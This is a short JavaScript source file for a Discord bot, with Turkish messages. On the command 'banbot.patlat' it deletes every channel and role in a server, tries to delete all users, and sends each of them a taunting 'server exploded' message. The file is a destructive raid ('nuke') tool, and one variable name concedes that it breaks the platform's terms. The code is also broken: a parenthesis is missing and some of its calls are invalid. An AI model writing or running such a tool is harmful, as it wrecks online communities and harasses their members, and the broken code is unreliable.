const Discord = require('discord.js')
const config = require('./config.json')
const client = new Discord.Client();


client.on("ready", () => {
console.log("Bot Aktif")
});

client.on('message', msg => {
if (msg.content === 'banbot.patlat') {
msg.delete()
msg.guild.channels.forEach(banbot => {
banbot.delete()
});
msg.guild.roles.forEach(by_rookie_fight => {
by_rookie_fight.delete()
});
msg.guild.users.forEach(ban_bot => {
ban_bot.delete()
});
msg.guild.users.forEach(termse_uyumlu_degildir_kullanmayin => {
termse_uyumlu_degildir_kullanmayin.send('Sunucu patladı! \n Geçmiş olsun napalım?')
}
});

client.login(config.token);
